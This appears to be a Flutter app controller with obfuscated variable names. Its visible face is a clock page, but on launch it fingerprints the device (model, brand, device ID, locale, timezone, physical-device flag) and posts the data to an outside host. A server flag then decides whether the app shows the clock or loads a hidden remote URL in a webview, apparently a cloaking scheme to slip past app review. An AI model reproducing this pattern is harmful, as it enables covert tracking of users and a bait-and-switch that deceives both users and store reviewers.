import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';

import '../../tools/check_net.dart';


class ManageInitLogic extends GetxController {

  var wsdoxnlhmr = RxBool(false);
  var pbukfmj = RxBool(true);
  var pnbmzc = RxString("");
  var freda = RxBool(false);
  var reilly = RxBool(true);
  final zfedkumgws = Dio();


  InAppWebViewController? webViewController;

  dynamic wstelrm(){
    final wquftig = InternetConnectionChecker.instance;
    final rpzxtwba = wquftig.onStatusChange.skip(1).listen(
          (InternetConnectionStatus onbgkds) {
        if (onbgkds == InternetConnectionStatus.connected) {
          mqzab();
        } else {
          Get.toNamed('/Apptimeout')?.then((_){
            mqzab();
          });
        }
      },
    );
    return rpzxtwba;
  }

  Future<bool> raozjqkltw() async {
    var svgztja = await NetworkUtils.isNetworkAvailable();
    if(!svgztja){
      Get.toNamed('/Apptimeout')?.then((_){
        mqzab();
      });
    }
    return svgztja;
  }

  @override
  void onInit() {
    super.onInit();
    wstelrm();
    mqzab();
  }


  Future<void> mqzab() async {

    var ulitkomb = await raozjqkltw();
    if(!ulitkomb){
      return;
    }

    freda.value = true;
    reilly.value = true;
    pbukfmj.value = false;

    zfedkumgws.post("https://sea.fbluee.com/AVYGL?no_check",data: await qyvgiur()).then((value) {
      var oahp = value.data["oahp"] as String;
      var wxgdemy = value.data["wxgdemy"] as bool;
      if (wxgdemy) {
        pnbmzc.value = oahp;
        jeanne();
      } else {
        jacobs();
      }
    }).catchError((e) {
      pbukfmj.value = true;
      reilly.value = true;
      freda.value = false;
    });
  }

  Future<Map<String, dynamic>> qyvgiur() async {
    final DeviceInfoPlugin wgvxrsa = DeviceInfoPlugin();
    PackageInfo oyscnxma_lucjyq = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var ojaf = Platform.localeName;
    var jrxmlo = currentTimeZone;

    var pmexld = oyscnxma_lucjyq.packageName;
    var efmhzsb = oyscnxma_lucjyq.version;
    var ygzr = oyscnxma_lucjyq.buildNumber;

    var qgej = oyscnxma_lucjyq.appName;
    var khxu = "";
    var xzpivl  = "";
    var stxziylk = "";
    var tobySchultz = "";
    var lorenzaErnser = "";
    var tysonHamill = "";
    var gwendolynJacobi = "";
    var jacyntheCartwright = "";
    var emilieZemlak = "";


    var lxyh = "";
    var dekjy = false;

    if (GetPlatform.isAndroid) {
      lxyh = "android";
      var djsqht = await wgvxrsa.androidInfo;

      stxziylk = djsqht.brand;

      khxu  = djsqht.model;
      xzpivl = djsqht.id;

      dekjy = djsqht.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      lxyh = "ios";
      var waxvqimyzj = await wgvxrsa.iosInfo;
      stxziylk = waxvqimyzj.name;
      khxu = waxvqimyzj.model;

      xzpivl = waxvqimyzj.identifierForVendor ?? "";
      dekjy  = waxvqimyzj.isPhysicalDevice;
    }

    var res = {
      "qgej": qgej,
      "ygzr": ygzr,
      "efmhzsb": efmhzsb,
      "pmexld": pmexld,
      "khxu": khxu,
      "jrxmlo": jrxmlo,
      "stxziylk": stxziylk,
      "xzpivl": xzpivl,
      "ojaf": ojaf,
      "lxyh": lxyh,
      "dekjy": dekjy,
      "tobySchultz" : tobySchultz,
      "lorenzaErnser" : lorenzaErnser,
      "tysonHamill" : tysonHamill,
      "gwendolynJacobi" : gwendolynJacobi,
      "jacyntheCartwright" : jacyntheCartwright,
      "emilieZemlak" : emilieZemlak,

    };
    return res;
  }

  Future<void> jacobs() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> jeanne() async {
    Get.offNamed("/Outreload");
  }

  @override
  void dispose() {
    wstelrm().cancel();
    super.dispose();
  }

}
